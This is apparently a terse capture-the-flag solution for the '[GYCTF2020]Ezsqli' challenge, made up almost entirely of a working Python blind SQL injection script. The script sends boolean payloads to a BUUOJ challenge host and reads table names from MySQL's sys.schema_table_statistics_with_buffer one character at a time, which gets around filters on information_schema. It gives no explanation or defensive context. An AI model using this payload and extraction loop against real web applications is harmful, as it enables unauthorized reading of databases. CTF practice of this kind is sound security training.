## [GYCTF2020]Ezsqli

无列明注入

```
import requests
url = 'http://bfd71058-3cf0-4e87-8731-8935a651f051.node3.buuoj.cn/'
payload = '2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),{},1))={}'
result = ''
for j in range(1,500):
    for i in range(32, 127):
        py = payload.format(j,i)
        post_data = {'id': py}
        re = requests.post(url, data=post_data)
        if 'Nu1L' in re.text:
            result += chr(i)
            print(result)
            break
```

